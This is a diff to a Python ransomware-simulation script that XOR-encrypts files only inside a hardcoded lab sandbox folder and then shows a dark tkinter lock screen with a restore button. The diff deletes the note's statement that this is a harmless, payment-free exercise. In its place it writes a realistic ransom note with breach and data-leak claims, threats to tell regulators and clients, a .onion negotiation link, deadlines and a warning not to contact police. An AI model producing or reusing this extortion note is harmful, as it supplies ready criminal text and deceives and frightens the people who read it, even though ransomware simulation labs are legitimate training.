@@ -13,17 +13,34 @@ from __future__ import annotations
 import argparse
 import os
 from pathlib import Path
+from datetime import datetime, timezone
+import time
+from uuid import uuid4
+import tkinter as tk
+from tkinter import messagebox
 
 # Hardcoded sandbox path. The script must never process anything outside this directory.
 SANDBOX_DIR = Path(r"C:\RansomLab\sandbox")
 LOCKED_EXTENSION = ".locked"
 RANSOM_NOTE_NAME = "README.txt"
+ACTIVITY_LOG_NAME = "activity.log"
 XOR_KEY = b"EDU_SAFE_KEY_2026"
 
 
 def log(message: str) -> None:
     """Print a standardized log message."""
-    print(f"[SIM] {message}")
+    stamped_message = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [SIM] {message}"
+    print(stamped_message)
+
+    # Write logs only inside the sandbox so no external filesystem activity occurs.
+    log_path = SANDBOX_DIR / ACTIVITY_LOG_NAME
+    try:
+        if SANDBOX_DIR.exists() and SANDBOX_DIR.is_dir() and is_within_sandbox(log_path):
+            with log_path.open("a", encoding="utf-8") as handle:
+                handle.write(stamped_message + "\n")
+    except Exception:
+        # Logging to file is best-effort; console output remains primary.
+        pass
 
 
 def xor_bytes(data: bytes, key: bytes) -> bytes:
@@ -81,18 +98,206 @@ def create_ransom_note() -> None:
         log(f"Refusing to write note outside sandbox: {note_path}")
         return
 
+    incident_id = uuid4().hex[:12].upper()
+    generated_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
     note_text = (
-        "Your files have been locked in this EDUCATIONAL simulation.\n"
-        "This is a harmless training exercise.\n"
-        "Run this script in decrypt mode to restore your files.\n"
-        "No payment is needed.\n"
-    )
+    "::: 5H4D0W_1NC LOCKER ::: \n"
+    "\n"
+    "!!! ALL YOUR FILES ARE ENCRYPTED !!!\n"
+    "\n"
+    "Hello,\n"
+    "\n"
+    "If you are reading this message, it means your company's network has been breached \n"
+    "and all your data has been encrypted by \"5H4D0W_1NC\" group. \n"
+    "\n"
+    "WHAT HAPPENED?\n"
+    "We have exploited vulnerabilities in your network infrastructure. All your servers, \n"
+    "databases, and backups have been locked with military-grade encryption algorithms \n"
+    "(AES-256 & RSA-2048). You cannot recover your files without our private key.\n"
+    "\n"
+    "DATA LEAK WARNING:\n"
+    "Before encryption, we downloaded your confidential data . If you refuse to pay or do not contact us, this \n"
+    "data will be published on our Tor blog for your competitors and regulators to see. \n"
+    "\n"
+    "HOW TO GET YOUR FILES BACK?\n"
+    "We are not interested in destroying your business, we only want payment.\n"
+    "You must purchase a unique decryption tool from us.\n"
+    "\n"
+    ">>> LEGAL & REPUTATION NOTICE (IMPORTANT):\n"
+    "We have analyzed your files If you do not pay:\n"
+    "1. We will send copies of this incriminating data directly to your GOVERNMENT \n"
+    "   agencies and regulators to trigger an investigation against you.\n"
+    "2. We will email your clients, business partners, and everyone in your CONTACT \n"
+    "   LIST to inform them that you lost their data.\n"
+    "\n"
+    "INSTRUCTIONS:\n"
+    "1. Download and install Tor Browser: https://www.torproject.org/\n"
+    "2. Open Tor Browser and navigate to our chat portal:\n"
+    "   http://oaptxiyisljt2kv3we2we34kuudmqda7f2geffoylzpeo7ourhtz4dad.onion/login.php\n"
+    "3. Enter your Personal ID to start the negotiation\n"
+    "(If the website is down or inaccessible, please try again after some time.)\n"
+    "\n"
+    "Your Personal ID:\n"
+    "[snip]-0APT-KEY\n"
+    "\n"
+    "DEADLINE:\n"
+    "You have 24 hours to contact us. After this, the price will double.\n"
+    "If we do not hear from you within 48 hours, your data will be leaked permanently.\n"
+    "\n"
+    "ATTENTION:\n"
+    "- Do not rename encrypted files.\n"
+    "- Do not try to decrypt using third-party software (you may lose data forever).\n"
+    "- Do not call the police or FBI (we will leak data immediately).\n"
+    "\n"
+    "-- 5H4D0W_1NC Team --\n"
+)
 
     try:
         note_path.write_text(note_text, encoding="utf-8")
         log(f"Created ransom note: {note_path}")
     except Exception as exc:
         log(f"Failed to create ransom note {note_path}: {exc}")
+
+
+def open_activity_log() -> None:
+    """Open the sandbox activity log file using the default system viewer."""
+    log_path = SANDBOX_DIR / ACTIVITY_LOG_NAME
+    if not is_within_sandbox(log_path):
+        log(f"Refusing to open log outside sandbox: {log_path}")
+        return
+
+    if not log_path.exists():
+        log(f"Activity log file not found: {log_path}")
+        return
+
+    try:
+        os.startfile(str(log_path))
+        log(f"Opened activity log: {log_path}")
+    except Exception as exc:
+        log(f"Failed to open activity log {log_path}: {exc}")
+
+
+def launch_lock_interface(affected_files: int, elapsed_seconds: float) -> None:
+    """
+    Show a safe simulation UI after encryption completes.
+
+    This interface does not alter system settings and only calls sandbox-scoped
+    simulation functions already protected by safety checks.
+    """
+    root = tk.Tk()
+    root.title("Security Access Console")
+    root.geometry("760x420")
+    root.configure(bg="#101010")
+
+    container = tk.Frame(root, bg="#161616", padx=22, pady=20, highlightbackground="#2d2d2d", highlightthickness=1)
+    container.pack(fill="both", expand=True, padx=24, pady=24)
+
+    title = tk.Label(
+        container,
+        text="SECURITY ACCESS CONTROL",
+        font=("Consolas", 20, "bold"),
+        fg="#ff6b3d",
+        bg="#161616",
+    )
+    title.pack(anchor="w")
+
+    subtitle = tk.Label(
+        container,
+        text="Data access restricted",
+        font=("Consolas", 12),
+        fg="#d0d0d0",
+        bg="#161616",
+        pady=10,
+    )
+    subtitle.pack(anchor="w")
+
+    info_text = (
+        f"Affected files : {affected_files}\n"
+        f"Processing time: {elapsed_seconds:.2f} s\n"
+        f"Current status : Files inaccessible\n"
+        f"Sandbox scope  : {SANDBOX_DIR}"
+    )
+    info = tk.Label(
+        container,
+        text=info_text,
+        justify="left",
+        font=("Consolas", 12),
+        fg="#f0f0f0",
+        bg="#161616",
+        pady=8,
+    )
+    info.pack(anchor="w")
+
+    status_var = tk.StringVar(value="Recovery required")
+    status_label = tk.Label(
+        container,
+        textvariable=status_var,
+        font=("Consolas", 11, "bold"),
+        fg="#ffb347",
+        bg="#161616",
+        pady=10,
+    )
+    status_label.pack(anchor="w")
+
+    buttons = tk.Frame(container, bg="#161616")
+    buttons.pack(anchor="w", pady=16)
+
+    def on_restore_access() -> None:
+        start = time.perf_counter()
+        decrypt_stats = process_directory("decrypt")
+        decrypt_elapsed = time.perf_counter() - start
+        log_summary("decrypt", decrypt_stats)
+        status_var.set(
+            f"Access restored | decrypted={decrypt_stats['decrypted']} | time={decrypt_elapsed:.2f}s"
+        )
+        messagebox.showinfo("Recovery Complete", "Sandbox files have been restored.")
+
+    restore_button = tk.Button(
+        buttons,
+        text="Restore Access",
+        command=on_restore_access,
+        bg="#222222",
+        fg="#f5f5f5",
+        activebackground="#2f2f2f",
+        activeforeground="#ffffff",
+        relief="flat",
+        padx=14,
+        pady=8,
+        font=("Consolas", 11, "bold"),
+    )
+    restore_button.grid(row=0, column=0, padx=(0, 12))
+
+    log_button = tk.Button(
+        buttons,
+        text="View Activity Log",
+        command=open_activity_log,
+        bg="#222222",
+        fg="#f5f5f5",
+        activebackground="#2f2f2f",
+        activeforeground="#ffffff",
+        relief="flat",
+        padx=14,
+        pady=8,
+        font=("Consolas", 11),
+    )
+    log_button.grid(row=0, column=1, padx=(0, 12))
+
+    exit_button = tk.Button(
+        buttons,
+        text="Exit",
+        command=root.destroy,
+        bg="#3a1f1b",
+        fg="#ffd7cf",
+        activebackground="#4a2a25",
+        activeforeground="#ffffff",
+        relief="flat",
+        padx=14,
+        pady=8,
+        font=("Consolas", 11),
+    )
+    exit_button.grid(row=0, column=2)
+
+    root.mainloop()
 
 
 def process_directory(mode: str) -> dict[str, int]:
@@ -116,7 +321,7 @@ def process_directory(mode: str) -> dict[str, int]:
         "renamed_restored": 0,
         "skipped_already_locked": 0,
         "skipped_non_locked": 0,
-        "skipped_note": 0,
+        "skipped_protected": 0,
         "errors": 0,
     }
 
@@ -151,9 +356,10 @@ def process_directory(mode: str) -> dict[str, int]:
                 log(f"Skipping unsafe file outside sandbox: {file_path}")
                 continue
 
-            if filename == RANSOM_NOTE_NAME:
-                log(f"Skipping ransom note file: {file_path}")
-                stats["skipped_note"] += 1
+            # Keep internal simulation files readable for troubleshooting and control.
+            if filename in {RANSOM_NOTE_NAME, ACTIVITY_LOG_NAME}:
+                log(f"Skipping protected simulation file: {file_path}")
+                stats["skipped_protected"] += 1
                 continue
 
             if mode == "encrypt":
@@ -210,7 +416,7 @@ def process_directory(mode: str) -> dict[str, int]:
         log("Troubleshoot: no files were found in the sandbox.")
 
     if mode == "encrypt" and stats["encrypted"] == 0 and stats["found_files"] > 0:
-        log("Troubleshoot: nothing encrypted. Files may already end with .locked, or only README.txt is present.")
+        log("Troubleshoot: nothing encrypted. Files may already end with .locked, or only protected files are present.")
 
     if mode == "decrypt" and stats["decrypted"] == 0 and stats["found_files"] > 0:
         log("Troubleshoot: nothing decrypted. No files ending with .locked were found.")
@@ -230,7 +436,7 @@ def log_summary(mode: str, stats: dict[str, int]) -> None:
         log(f"Decrypted files: {stats['decrypted']}")
         log(f"Renamed back to original: {stats['renamed_restored']}")
         log(f"Skipped non-.locked files: {stats['skipped_non_locked']}")
-    log(f"Skipped ransom note: {stats['skipped_note']}")
+    log(f"Skipped protected files: {stats['skipped_protected']}")
     log(f"Errors: {stats['errors']}")
 
 
@@ -248,10 +454,13 @@ def main() -> None:
 
     if args.mode == "encrypt":
         log("Starting encryption simulation...")
+        started_at = time.perf_counter()
         stats = process_directory("encrypt")
         create_ransom_note()
+        elapsed = time.perf_counter() - started_at
         log_summary("encrypt", stats)
         log("Encryption simulation complete.")
+        launch_lock_interface(affected_files=stats["encrypted"], elapsed_seconds=elapsed)
     elif args.mode == "decrypt":
         log("Starting decryption simulation...")
         stats = process_directory("decrypt")
